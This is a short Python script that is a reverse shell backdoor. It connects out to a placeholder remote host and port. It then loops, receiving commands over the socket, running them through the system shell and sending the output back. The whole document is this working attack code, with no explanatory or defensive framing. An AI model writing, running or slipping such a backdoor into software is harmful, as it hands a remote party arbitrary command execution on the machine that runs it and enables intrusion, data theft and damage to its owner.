import socket
import subprocess

def exec_command(command):
    return subprocess.check_output(command, shell=True)


con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect(("TARGET-MACHINE-IP", PORT))
con.send("[+] Connection established".encode())

while True:
    command = con.recv(1024).decode()
    command_result = exec_command(command)
    con.send(command_result)

con.close()
